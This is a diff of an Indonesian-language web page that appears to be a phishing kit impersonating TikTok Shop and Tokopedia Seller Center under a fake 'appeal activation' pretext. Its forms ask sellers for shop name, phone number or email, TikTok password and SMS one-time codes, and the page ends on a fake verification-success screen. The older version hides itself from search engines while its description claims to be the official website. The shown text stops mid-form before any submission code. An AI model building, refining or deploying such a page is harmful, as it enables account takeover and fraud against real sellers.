@@ -2,588 +2,728 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <meta name="robots" content="noindex, nofollow, noarchive">
-    <title>TikTok Shop - Aktivasi Banding</title>
-    <meta name="description" content="Website Resmi Tokopedia & TikTok Shop Seller, Website Penghapusan Riwayat Pelanggaran Seller Center. Aktivasi Agar Tidak Di Blokir Permanen">
-      <meta property="og:title" content="Website Resmi Tokopedia & TikTok Shop Seller">
-      <meta property="og:description" content="Pengajuan Banding TikTok Shop Seller. Website Penghapusan Riwayat Pelanggaran Seller Center. Aktivasi Agar Tidak Di Blokir Permanen">
- 
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Akun</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-        }
-        body {
-            background-color: #ffffff;
-            color: #000000;
-            line-height: 1.6;
-            min-height: 100vh;
-        }
-        .container {
-            width: 100%;
-            max-width: 480px;
-            margin: 0 auto;
-            min-height: 100vh;
-            background: #ffffff;
-            padding: 4vw 5vw;
-            display: none;
-        }
-        .container:first-child { display: block; }
-        .header-top {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 5vw;
-        }
-        .back-btn {
-            font-size: clamp(1.8rem, 7vw, 2.2rem);
-            font-weight: 600;
-            cursor: pointer;
-            color: #000;
-        }
-        .icon-info {
-            width: clamp(1.5rem, 6vw, 1.8rem);
-            height: clamp(1.5rem, 6vw, 1.8rem);
-            cursor: pointer;
-        }
-        h1 {
-            font-size: clamp(1.2rem, 4.5vw, 1.5rem);
-            font-weight: 700;
-            text-align: center;
-            margin-bottom: 2vw;
-            line-height: 1.4;
-        }
-        h2 {
-            font-size: clamp(1.3rem, 5vw, 1.5rem);
-            font-weight: 700;
-            margin-bottom: 3vw;
-        }
-        .subhead {
-            text-align: center;
-            font-size: clamp(0.9rem, 3.5vw, 1rem);
-            color: #666;
-            margin-bottom: 8vw;
-        }
-        .subhead a {
-            color: #000;
-            text-decoration: none;
-            font-weight: 500;
-        }
-        .btn {
-            width: 100%;
-            padding: 3.8vw;
-            border: none;
-            border-radius: 10px;
-            font-size: 1rem;
-            font-weight: 600;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 2vw;
-            transition: all 0.2s;
-            margin-bottom: 3vw;
-        }
-        .btn-tiktok {
-            background: #000000;
-            color: #ffffff;
-            margin-bottom: 6vw;
-        }
-        .btn-tiktok:hover { background: #333333; }
-        .btn-light {
-            background: #f5f5f5;
-            color: #000000;
-            border: 1px solid #e5e5e5;
-        }
-        .btn-light:hover { background: #e8e8e8; }
-        .btn-disabled {
-            background: #e0e0e0;
-            color: #999;
-            cursor: not-allowed;
-        }
-        .btn-icon {
-            width: clamp(1.2rem, 5vw, 1.4rem);
-            height: auto;
-        }
-        .btn-icon-small {
-            width: clamp(1rem, 4vw, 1.2rem);
-            height: auto;
-        }
-        .divider {
-            text-align: center;
-            color: #999;
-            margin: 5vw 0;
-            position: relative;
-        }
-        .divider::before, .divider::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            width: 35%;
-            height: 1px;
-            background: #e5e5e5;
-        }
-        .divider::before { left: 0; }
-        .divider::after { right: 0; }
-        .desc-text {
-            font-size: clamp(0.85rem, 3.5vw, 0.95rem);
-            color: #666;
-            text-align: center;
-            margin-top: 8vw;
-            line-height: 1.6;
-        }
-        .desc-text a {
-            color: #000;
-            text-decoration: underline;
-        }
-        .tabs {
-            display: flex;
-            background: #f5f5f5;
-            border-radius: 10px;
-            padding: 0.5vw;
-            margin-bottom: 5vw;
-        }
-        .tab {
-            flex: 1;
-            padding: 2.5vw;
-            text-align: center;
-            border-radius: 8px;
-            font-size: 0.95rem;
-            font-weight: 500;
-            cursor: pointer;
-            color: #666;
-            transition: all 0.2s;
-        }
-        .tab.active {
-            background: #ffffff;
-            color: #000;
-            font-weight: 600;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
-        }
-        .input-container { margin-bottom: 3vw; }
-        .input-view { display: none; }
-        .input-view.active { display: block; }
-        .wajib {
-            display: block;
-            font-size: 0.9rem;
-            color: #333;
-            margin-bottom: 1.5vw;
-            font-weight: 500;
-        }
-        .input-row, .input-full, .form-group input, .input-group, .input-prefix {
-            display: flex;
-            align-items: center;
-            border: 1px solid #e5e5e5;
-            border-radius: 10px;
-            overflow: hidden;
-            width: 100%;
-            height: clamp(3rem, 12vw, 3.5rem);
-            background: #ffffff;
-        }
-        .input-row input, .input-full input, .form-group input, .input-group input, .input-prefix input {
-            flex: 1;
-            padding: 0 2vw;
-            border: none;
-            outline: none;
-            font-size: clamp(0.9rem, 3.6vw, 0.95rem);
-            background: transparent;
-            width: 100%;
-            height: 100%;
-        }
-        .country-code {
-            display: flex;
-            align-items: center;
-            padding: 0 2vw;
-            background: #f5f5f5;
-            border-right: 1px solid #e5e5e5;
-            gap: 1vw;
-            height: 100%;
-        }
-        .country-code span {
-            font-size: 0.95rem;
-            font-weight: 500;
-        }
-        .country-code select {
-            border: none;
-            background: transparent;
-            font-size: 0.9rem;
-            cursor: pointer;
-        }
-        .form-group { margin-bottom: 4vw; }
-        .form-group label {
-            display: block;
-            font-size: 0.9rem;
-            color: #333;
-            margin-bottom: 1.5vw;
-            font-weight: 500;
-        }
-        .input-group { position: relative; }
-        .input-group input { padding-right: 10vw; }
-        .eye-icon {
-            position: absolute;
-            right: 3vw;
-            width: clamp(1.3rem, 5vw, 1.4rem);
-            height: clamp(1.3rem, 5vw, 1.4rem);
-            cursor: pointer;
-        }
-        .forgot-link {
-            text-align: right;
-            margin-top: 1vw;
-        }
-        .forgot-link a {
-            font-size: 0.9rem;
-            color: #000;
-            text-decoration: none;
-        }
-        .input-prefix .prefix {
-            padding: 0 2vw;
-            background: #f5f5f5;
-            border-right: 1px solid #e5e5e5;
-            font-size: 0.95rem;
-            font-weight: 500;
-            height: 100%;
-            display: flex;
-            align-items: center;
-        }
-        .error-text {
-            color: #d32f2f;
-            font-size: 0.85rem;
-            margin-top: 1vw;
-            display: none;
-        }
-        .otp-desc {
-            text-align: center;
-            color: #666;
-            font-size: 0.95rem;
-            margin-bottom: 5vw;
-        }
-        .otp-input-group {
-            display: flex;
-            justify-content: center;
-            gap: 3vw;
-            margin-bottom: 5vw;
-        }
-        .otp-input-group input {
-            width: clamp(3rem, 12vw, 3.5rem);
-            height: clamp(3rem, 12vw, 3.5rem);
-            text-align: center;
-            font-size: 1.2rem;
-            font-weight: 600;
-            border: 1px solid #e5e5e5;
-            border-radius: 10px;
-            outline: none;
-        }
-        .otp-input-group input:focus { border-color: #000; }
-        .ubah-kode-link {
-            text-align: center;
-            margin-bottom: 6vw;
-        }
-        .ubah-kode-link a {
-            display: inline-block;
-            margin: 0 2vw;
-            color: #000;
-            font-size: 0.9rem;
-            text-decoration: none;
-        }
-        .sms-info {
-            text-align: center;
-            font-size: 0.85rem;
-            color: #2e7d32;
-            margin-bottom: 3vw;
-            padding: 2vw;
-            background: #e8f5e9;
-            border-radius: 8px;
-            display: none;
-        }
-        .result-page {
-            text-align: center;
-            padding-top: 8vw;
-        }
-        .result-icon {
-            font-size: 4rem;
-            margin-bottom: 4vw;
-        }
-        .result-page h2 {
-            font-size: 1.3rem;
-            margin-bottom: 4vw;
-        }
-        .result-desc {
-            font-size: clamp(0.95rem, 4vw, 1.05rem);
-            color: #333;
-            line-height: 1.7;
-            margin-bottom: 8vw;
-            text-align: left;
-            background: #fff3e0;
-            padding: 5vw;
-            border-radius: 10px;
-            border-left: 4px solid #ff9800;
-        }
-        .back-icon-wrap {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            width: clamp(3.5rem, 14vw, 4rem);
-            height: clamp(3.5rem, 14vw, 4rem);
-            border-radius: 50%;
-            background: #f5f5f5;
-            font-size: clamp(1.8rem, 7vw, 2rem);
-            cursor: pointer;
-            margin-bottom: 2vw;
-        }
-        .back-text {
-            color: #666;
-            font-size: 0.95rem;
-        }
-        .hidden { display: none !important; }
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+}
+html, body {
+    width: 100%;
+    background-color: #f5f5f7;
+    color: #1d1d1f;
+    padding: 16px;
+    max-width: 480px;
+    margin: 0 auto;
+}
+
+/* === GAMBAR TAUTAN DI TENGAH === */
+     .gambar-tautan-wadah {
+         display: flex;
+         justify-content: center;
+         align-items: center;
+         width: 100%;
+         margin-bottom: 20px;
+     }
+     .gambar-tautan {
+         display: block;
+         width: 100%;
+         max-width: 200px;
+         height: auto;
+         border-radius: 12px;
+         text-decoration: none;
+         transition: opacity 0.2s ease;
+     }
+     .gambar-tautan:active {
+         opacity: 0.8;
+     }
+     .gambar-tautan img {
+         width: 100%;
+         height: auto;
+         border-radius: 12px;
+         display: block;
+         object-fit: contain;
+     }
+
+.container {
+    background: #fff;
+    padding: 24px 16px;
+    border-radius: 16px;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+    margin-bottom: 12px;
+    width: 100%;
+    box-sizing: border-box;
+}
+h1 {
+    font-size: 22px;
+    text-align: center;
+    margin-bottom: 8px;
+    color: #111;
+}
+h2 {
+    font-size: 20px;
+    text-align: center;
+    margin-bottom: 16px;
+    color: #111;
+}
+.subhead {
+    text-align: center;
+    font-size: 14px;
+    color: #6e6e73;
+    margin-bottom: 24px;
+    line-height: 1.5;
+}
+.desc-text {
+    margin-top: 16px;
+    font-size: 13px;
+    color: #6e6e73;
+    text-align: center;
+    line-height: 1.5;
+}
+.desc-text a {
+    color: #007aff;
+    text-decoration: none;
+}
+.header-top {
+    display: flex;
+    justify-content: flex-start;
+    align-items: center;
+    margin-bottom: 24px;
+}
+.back-btn {
+    font-size: 24px;
+    color: #007aff;
+    cursor: pointer;
+    line-height: 1;
+}
+.tabs {
+    display: flex;
+    border-bottom: 1px solid #e5e5e7;
+    margin-bottom: 24px;
+}
+.tab {
+    flex: 1;
+    padding: 12px 0;
+    text-align: center;
+    font-size: 15px;
+    color: #86868b;
+    cursor: pointer;
+    border-bottom: 2px solid transparent;
+}
+.tab.active {
+    color: #007aff;
+    border-bottom-color: #007aff;
+    font-weight: 600;
+}
+.form-group {
+    margin-bottom: 20px;
+}
+label.wajib {
+    display: block;
+    font-size: 14px;
+    color: #333;
+    margin-bottom: 8px;
+    font-weight: 500;
+}
+.input-row {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    width: 100%;
+}
+.country-code {
+    font-size: 15px;
+    color: #333;
+    font-weight: 500;
+    padding: 0 12px;
+    background: #f2f2f7;
+    border: 1px solid #d2d2d7;
+    border-radius: 10px;
+    height: 48px;
+    line-height: 48px;
+    white-space: nowrap;
+    flex-shrink: 0;
+}
+.input-wrapper {
+    position: relative;
+    width: 100%;
+}
+input[type="tel"],
+input[type="email"],
+input[type="password"],
+input[type="text"] {
+    width: 100%;
+    height: 44px;
+    padding: 0 12px;
+    padding-right: 40px;
+    font-size: 15px;
+    border: 1px solid #d2d2d7;
+    border-radius: 8px;
+    outline: none;
+    background: #fff;
+    color: #1d1d1f;
+}
+input::placeholder { color: #c7c7cc; }
+input:focus {
+    border-color: #007aff;
+    box-shadow: 0 0 0 3px rgba(0,122,255,0.1);
+}
+/* === IKON MATA DENGAN GAMBAR === */
+.icon-eye {
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    cursor: pointer;
+    width: 20px;       /* ← Lebar gambar, perkecil angkanya untuk lebih kecil */
+    height: 20px;      /* ← Tinggi gambar, perkecil angkanya untuk lebih kecil */
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    user-select: none;
+}
+.icon-eye img {
+    width: 100%;
+    height: 100%;
+    object-fit: contain;
+    display: block;
+}
+
+.otp-input-group {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    width: 100%;
+    padding: 0 4px;
+    margin: 20px 0;
+    box-sizing: border-box;
+    gap: 6px;
+}
+.otp-kotak {
+    width: 18% !important;
+    min-width: 18% !important;
+    max-width: 18% !important;
+    height: 38px !important;
+    font-size: 16px !important;
+    font-weight: 600;
+    text-align: center !important;
+    line-height: 1 !important;
+    display: flex !important;
+    justify-content: center !important;
+    align-items: center !important;
+    border: 1px solid #d1d1d6;
+    border-radius: 6px;
+    outline: none;
+    background: #ffffff !important;
+    color: #000000 !important;
+    flex: 0 0 auto !important;
+    caret-color: #007aff;
+    padding: 0 !important;
+}
+.otp-input-group.otp-6 .otp-kotak {
+    width: calc((100% - 5 * 6px) / 6) !important;
+    min-width: calc((100% - 5 * 6px) / 6) !important;
+    max-width: calc((100% - 5 * 6px) / 6) !important;
+    height: 36px !important;
+    font-size: 15px !important;
+    font-weight: 600;
+    text-align: center !important;
+    line-height: 1 !important;
+    display: flex !important;
+    justify-content: center !important;
+    align-items: center !important;
+    border: 1px solid #d1d1d6;
+    border-radius: 6px;
+    background: #ffffff !important;
+    color: #000000 !important;
+    flex: 0 0 auto !important;
+    padding: 0 !important;
+}
+.otp-kotak:focus {
+    border-color: #007aff;
+    background: #f9fbff !important;
+}
+.ubah-kode-link {
+    text-align: center;
+    margin: 16px 0 24px;
+}
+.ubah-kode-link a {
+    display: inline-block;
+    margin: 0 6px;
+    color: #007aff;
+    font-size: 14px;
+    text-decoration: underline;
+}
+.btn {
+    width: 100%;
+    padding: 13px;
+    font-size: 16px;
+    font-weight: 500;
+    border-radius: 12px;
+    border: none;
+    cursor: pointer;
+    margin-bottom: 12px;
+}
+.btn:active { transform: scale(0.98); }
+.btn-disabled {
+    background-color: #e5e5e7 !important;
+    color: #86868b !important;
+    cursor: not-allowed;
+}
+.btn-hpemail { background-color: #007aff; color: #fff; }
+.btn-tiktok { background-color: #000; color: #fff; }
+.error-text {
+    font-size: 13px;
+    color: #ff3b30;
+    margin-top: 8px;
+    margin-bottom: 4px;
+    line-height: 1.5;
+}
+.result-page {
+    text-align: center;
+    padding: 20px 10px;
+}
+.result-icon {
+    font-size: 56px;
+    margin-bottom: 16px;
+}
+.result-desc {
+    font-size: 15px;
+    color: #6e6e73;
+    line-height: 1.5;
+    margin-bottom: 24px;
+}
+.back-icon-wrap {
+    display: inline-block;
+    margin-top: 10px;
+    font-size: 18px;
+    color: #007aff;
+    cursor: pointer;
+}
+
     </style>
 </head>
 <body>
 
-<!-- HALAMAN UTAMA -->
-<div class="container" id="page1">
-    <div class="header-top">
-        <span class="back-btn" style="visibility: hidden;">&lt;</span>
-        <svg class="icon-info" fill="#000000" viewBox="0 0 24 24">
-            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
-        </svg>
-    </div>
-    <h1>Aktivasi Pengajuan Banding<br>TikTok Shop Seller Center</h1>
-    <p class="subhead">Toko di Indonesia <a href="#">Ubah</a></p>
+<div class="header-logo-container">
 
-    <button class="btn btn-tiktok" onclick="bukaForm('tiktok')">
-        <svg class="btn-icon" viewBox="0 0 24 24" fill="white">
-            <path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-5.2 1.74 2.89 2.89 0 012.31-4.64 2.93 2.93 0 01.88.13V9.4a3.4 3.4 0 00-.88-.14 4.85 4.85 0 00-3.77 4.24 4.85 4.85 0 003.77 4.24 4.85 4.85 0 003.77-4.24V4.87a4.85 4.85 0 003.77 4.24v3.45a3.74 3.74 0 001.88-.51 3.78 3.78 0 001.53-2.87 3.74 3.74 0 00-1.53-2.87z"/>
-        </svg>
-        Lanjutkan dengan TikTok
-    </button>
 
-    <p class="divider">atau</p>
-
-    <button class="btn btn-light" onclick="bukaForm('masuk')">
-        <img src="https://cdn-icons-png.flaticon.com/512/542/542638.png" alt="Email" class="btn-icon-small">
-        Masuk dengan email/nomor telepon
-    </button>
-
-    <button class="btn btn-light" onclick="goToPage('page2')">
-        <img src="https://cdn-icons-png.flaticon.com/512/3059/3059978.png" alt="Kata Sandi" class="btn-icon-small">
-        Masuk dengan Kata Sandi
-    </button>
-
-    <p class="desc-text">
-        Dengan melanjutkan, Anda menyetujui <a href="#">Ketentuan Layanan</a> dan <a href="#">Kebijakan Privasi</a> TikTok Shop.
-    </p>
+ </div>
+ <div class="gambar-tautan-wadah">
+     <a href="#" class="gambar-tautan">
+       <img src="https://ikon-dusky.vercel.app/Logo_Tokopedia_dan_TikTok_Shop-2023_11_22-21_55_37_a0e034dbf9ba86166e7b8d373abfa37e_960x640_thumb.png" alt="Gambar">
+     </a>
+   </div>
+<!-- Halaman Awal -->
+<div class="container" id="page-awal">
+    <h1>Selamat Datang</h1>
+    <p class="subhead">Aktivasi Pengajuan Banding TikTok Shop Seller Center</p>
+    <button class="btn btn-hpemail" onclick="tampilkanHalaman('page-login-umum')">Masuk dengan Nomor HP / Email</button>
+    <button class="btn btn-tiktok" onclick="tampilkanHalaman('page-tiktok')">Lanjutkan dengan TikTok</button>
+    <p class="desc-text">Dengan melanjutkan, Anda menyetujui <a href="#">Kebijakan Privasi</a> dan <a href="#">Syarat Penggunaan</a></p>
 </div>
 
-<!-- HALAMAN FORM -->
-<div class="container" id="page-form">
+<!-- Halaman Masuk HP / Email -->
+<div class="container" id="page-login-umum" style="display: none;">
     <div class="header-top">
-  
-        <span class="back-btn" onclick="kembaliKeSebelumnya()">&lt;</span>
-
-
-        <svg class="icon-info" fill="#000000" viewBox="0 0 24 24">
-            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
-        </svg>
+        <span class="back-btn" onclick="tampilkanHalaman('page-awal')">&larr;</span>
     </div>
-    <h2 id="form-judul">Masuk</h2>
-    <p class="otp-desc" id="form-desc">Masukkan data akun Anda</p>
-
+    <h2>Masuk Akun</h2>
     <div class="tabs">
-        <div class="tab active" data-tab="hp">Nomor HP</div>
-        <div class="tab" data-tab="email">Email</div>
+        <div class="tab active" onclick="gantiTabUmum('hp')">Nomor HP</div>
+        <div class="tab" onclick="gantiTabUmum('email')">Email</div>
     </div>
-
-    <div class="input-container">
-        <div class="input-view active" id="form-view-hp">
+    <div id="umum-view-hp">
+        <div class="form-group">
+            <label class="wajib">Nama Toko</label>
+            <input type="text" id="umum-nama-toko-hp" placeholder="Nama toko Anda" oninput="cekValidasiUmumHP()">
+        </div>
+        <div class="form-group">
             <label class="wajib">Nomor Telepon</label>
             <div class="input-row">
-                <div class="country-code">
-                    <span>+62</span>
-
-                </div>
-                <input type="tel" id="form-hp" placeholder="Masukkan nomor HP" oninput="cekValidasiForm()">
+                <span class="country-code">+62</span>
+                <input type="tel" id="umum-hp" placeholder="08xxxxxxxxxx" maxlength="13" oninput="cekValidasiUmumHP()">
             </div>
         </div>
-        <div class="input-view" id="form-view-email">
-            <label class="wajib">Email</label>
-            <div class="input-full">
-                <input type="email" id="form-email" placeholder="Masukkan alamat email" oninput="cekValidasiForm()">
-            </div>
-        </div>
+        <p class="error-text" id="umum-error-hp"></p>
+        <button class="btn btn-disabled" id="umum-btn-hp" disabled onclick="lanjutKeOTP('hp')">Lanjutkan</button>
     </div>
-
-     <!-- ✅ INPUT NAMA TOKO UKURAN SAMA PERSIS -->
-    <div class="input-container">
-        <label class="wajib">Nama Toko Seller Center</label>
-        <div class="input-full">
-            <input type="text" id="nama-toko" placeholder="Masukkan nama toko Anda" oninput="cekValidasiLogin()">
+    <div id="umum-view-email" style="display: none;">
+        <div class="form-group">
+            <label class="wajib">Nama Toko</label>
+            <input type="text" id="umum-nama-toko-email" placeholder="Nama toko Anda" oninput="cekValidasiUmumEmail()">
         </div>
+        <div class="form-group">
+            <label class="wajib">Alamat Email</label>
+            <input type="email" id="umum-email" placeholder="nama@email.com" oninput="cekValidasiUmumEmail()">
+        </div>
+        <p class="error-text" id="umum-error-email"></p>
+        <button class="btn btn-disabled" id="umum-btn-email" disabled onclick="lanjutKeOTP('email')">Lanjutkan</button>
     </div>
-
-
-    <p class="error-text" id="form-kontak-error">Masukkan nomor diawali angka 8 atau email yang valid</p>
-    <button class="btn btn-disabled" id="form-btn" disabled onclick="lanjutKeOTP('form')">Lanjutkan</button>
 </div>
 
-<!-- HALAMAN MASUK DENGAN SANDI -->
-<div class="container" id="page2">
+<!-- Halaman TikTok -->
+<div class="container" id="page-tiktok" style="display: none;">
     <div class="header-top">
-        <span class="back-btn" onclick="kembaliKeSebelumnya()">&lt;</span>
-        <svg class="icon-info" fill="#000000" viewBox="0 0 24 24">
-            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
-        </svg>
+        <span class="back-btn" onclick="tampilkanHalaman('page-awal')">&larr;</span>
     </div>
-    <h2>Masuk</h2>
-
+    <h2>Masuk dengan Akun TikTok</h2>
     <div class="tabs">
-        <div class="tab active" data-tab="hp">Nomor HP</div>
-        <div class="tab" data-tab="email">Email</div>
+        <div class="tab active" onclick="gantiTabTikTok('hp')">Nomor HP</div>
+        <div class="tab" onclick="gantiTabTikTok('email')">Email</div>
     </div>
-
-    <div class="input-container">
-        <div class="input-view active" id="view-hp">
+    <div id="tiktok-view-hp">
+        <div class="form-group">
+            <label class="wajib">Nama Toko</label>
+            <input type="text" id="tiktok-nama-toko-hp" placeholder="Nama toko Anda" oninput="cekValidasiTikTokHP()">
+        </div>
+        <div class="form-group">
             <label class="wajib">Nomor Telepon</label>
             <div class="input-row">
-                <div class="country-code">
-                    <span>+62</span>
-
-                </div>
-                <input type="tel" id="login-hp" placeholder="8xx-xxxx-xxxx" oninput="cekValidasiLogin()">
+                <span class="country-code">+62</span>
+                <input type="tel" id="tiktok-hp" placeholder="08xxxxxxxxxx" maxlength="13" oninput="cekValidasiTikTokHP()">
             </div>
         </div>
-        <div class="input-view" id="view-email">
-            <label class="wajib">Email</label>
-            <div class="input-full">
-                <input type="email" id="login-email" placeholder="Masukkan alamat email" oninput="cekValidasiLogin()">
+        <div class="form-group">
+            <label class="wajib">Kata Sandi</label>
+            <div class="input-wrapper">
+                <input type="password" id="tiktok-sandi-hp" placeholder="Huruf besar di awal + karakter khusus" oninput="cekValidasiTikTokHP()">
+<!-- Ganti bagian ikon mata menjadi seperti di bawah -->
+ <span class="icon-eye" onclick="togglePassword('tiktok-sandi-hp')">
+     <img src="https://ikon-dusky.vercel.app/2v8p5kqf.png" alt="Tampilkan sandi" id="mata-gambar-hp">
+ </span>
             </div>
         </div>
+        <p class="error-text" id="tiktok-error-hp"></p>
+        <button class="btn btn-disabled" id="tiktok-btn-hp" disabled onclick="lanjutKeOTP('hp')">Lanjutkan</button>
     </div>
-
-       <!-- ✅ INPUT NAMA TOKO UKURAN SAMA PERSIS -->
-    <div class="input-container">
-        <label class="wajib">Nama Toko Seller Center</label>
-        <div class="input-full">
-            <input type="text" id="nama-toko" placeholder="Masukkan nama toko Anda" oninput="cekValidasiLogin()">
+    <div id="tiktok-view-email" style="display: none;">
+        <div class="form-group">
+            <label class="wajib">Nama Toko</label>
+            <input type="text" id="tiktok-nama-toko-email" placeholder="Nama toko Anda" oninput="cekValidasiTikTokEmail()">
         </div>
+        <div class="form-group">
+            <label class="wajib">Alamat Email</label>
+            <input type="email" id="tiktok-email" placeholder="nama@email.com" oninput="cekValidasiTikTokEmail()">
+        </div>
+        <div class="form-group">
+            <label class="wajib">Kata Sandi</label>
+            <div class="input-wrapper">
+                <input type="password" id="tiktok-sandi-email" placeholder="Huruf besar di awal + karakter khusus" oninput="cekValidasiTikTokEmail()">
+                <!-- dan untuk yang email -->
+ <span class="icon-eye" onclick="togglePassword('tiktok-sandi-email')">
+     <img src="https://ikon-dusky.vercel.app/2v8p5kqf.png" alt="Tampilkan sandi" id="mata-gambar-email">
+ </span>
+            </div>
+        </div>
+        <p class="error-text" id="tiktok-error-email"></p>
+        <button class="btn btn-disabled" id="tiktok-btn-email" disabled onclick="lanjutKeOTP('email')">Lanjutkan</button>
     </div>
-
-    <div class="form-group">
-        <label class="wajib">Kata Sandi</label>
-        <div class="input-group">
-            <input type="password" id="pass-login" placeholder="Masukkan kata sandi" oninput="cekValidasiLogin()">
-            <img src="https://cdn-icons-png.flaticon.com/512/159/159604.png" alt="Lihat Sandi" class="eye-icon" id="eye-login" onclick="togglePassword('pass-login', 'eye-login')">
-        </div>
-        <div class="forgot-link">
-            <a href="#" onclick="goToPage('page3')">Lupa Kata Sandi</a>
-        </div>
-    </div>
-    <p class="error-text" id="login-error">Masukkan nomor (diawali angka 8) atau email yang valid</p>
-    <button class="btn btn-disabled" id="btn-login" disabled onclick="lanjutKeOTP('login')">Lanjutkan</button>
 </div>
 
-<!-- HALAMAN OTP -->
-<div class="container" id="page-otp">
+<!-- Halaman OTP -->
+<div class="container" id="page-otp" style="display: none;">
     <div class="header-top">
-        <span class="back-btn" onclick="kembaliDariOTP()">&lt;</span>
-
-        <svg class="icon-info" fill="#000000" viewBox="0 0 24 24">
-            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
-        </svg>
+        <span class="back-btn" onclick="kembaliDariOTP()">&larr;</span>
     </div>
-    <h2 style="text-align: center;">Masukkan Kode OTP</h2>
-    <p class="otp-desc" id="otp-keterangan">Kode dikirim ke nomor atau email Anda</p>
-    <div class="sms-info" id="sms-pesan">✅ SMS diterima, kode otomatis terisi!</div>
-    <div class="otp-input-group" id="otp-kotak"></div>
-    <div class="ubah-kode-link" id="link-ubah-kode">
-        <a href="#" onclick="ubahKodeOTP()">Ubah nomor/email</a>
-        <a href="#" id="link-ganti-otp" onclick="gantiJumlahOTP()">Ganti kode 6 angka</a>
+    <h2 id="otp-judul">Masukkan Kode OTP (4 Angka)</h2>
+    <p class="subhead">Kode telah dikirim ke nomor/email Anda</p>
+    <div class="otp-input-group" id="otp-wadah"></div>
+    <div class="ubah-kode-link">
+        <a href="#" onclick="kembaliKeHalamanSebelumnya(); return false;">Ubah nomor/email</a>
+        <a href="#" id="tautan-ganti-otp" onclick="gantiJumlahOTP(); return false;">Ganti kode 6 angka</a>
     </div>
     <button class="btn btn-disabled" id="otp-btn" disabled onclick="kirimOTP()">Verifikasi</button>
 </div>
 
-<!-- HALAMAN HASIL -->
-<div class="container" id="page-result">
-    <div class="result-page">
-        <div class="result-icon">⚠️</div>
-        <h2>Pengajuan Banding Ditolak</h2>
-        <p class="result-desc">
-            Keranjang Kuning Anda belum terhubung.<br><br>
-            Hubungkan TikTok Seller Center ke Tokopedia terlebih dahulu.<br><br>
-            Silakan Buka Aplikasi Seller Center Untuk Menghubungkan TikTok Shop ke Tokopedia
-        </p>
-        <div class="back-icon-wrap" onclick="KembalikeHalamanSebelumnya()">&larr;</div>
-        <p class="back-text">Kembali ke halaman awal</p>
-    </div>
+<!-- Halaman Hasil -->
+<div class="container result-page" id="page-result" style="display: none;">
+    <div class="result-icon">✅</div>
+    <h2>Verifikasi Berhasil</h2>
+    <p class="result-desc">Data Anda telah terverifikasi. Selamat menggunakan layanan kami.</p>
+    <span class="back-icon-wrap" onclick="tampilkanHalaman('page-awal')">&larr; Kembali ke Halaman Awal</span>
 </div>
 
-<!-- HALAMAN LUPA SANDI -->
-<div class="container" id="page3">
-    <div class="header-top">
-        <span class="back-btn" onclick="kembaliKeHalamanSebelumnya()">&lt;</span>
-        <svg class="icon-info" fill="#000000" viewBox="0 0 24 24">
-            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
-        </svg>
-    </div>
-    <h2>Reset Kata Sandi</h2>
-    <p class="otp-desc">Kata sandi akan diperbarui juga di TikTok for Business</p>
-    <div class="tabs">
-        <div class="tab active" data-tab="hp">Nomor HP</div>
-        <div class="tab" data-tab="email">Email</div>
-    </div>
-    
-    <div id="tab-hp">
-        <div class="form-group">
-            <label class="wajib">Nomor HP</label>
-            <div class="input-prefix">
-                <span class="prefix">+62</span>
-                <input type="tel" id="reset-hp" placeholder="8xx-xxxx-xxxx" oninput="cekValidasiReset()">
-            </div>
-        </div>
-        <div class="form-group">
-            <label class="wajib">Kata Sandi Baru</label>
-            <div class="input-group">
-                <input type="password" id="pass-baru-hp" placeholder="Minimal 6 karakter" oninput="cekValidasiReset()">
-                <img src="https://cdn-icons-png.flaticon.com/512/159/159604.png" alt="Lihat" class="eye-icon" onclick="togglePass('pass-baru-hp', this)">
-            </div>
-        </div>
-        <div class="form-group">
-            <label class="wajib">Konfirmasi Sandi</label>
-            <div class="input-group">
-                <input type="password" id="pass-konfirm-hp" placeholder="Ulangi sandi baru" oninput="cekValidasiReset()">
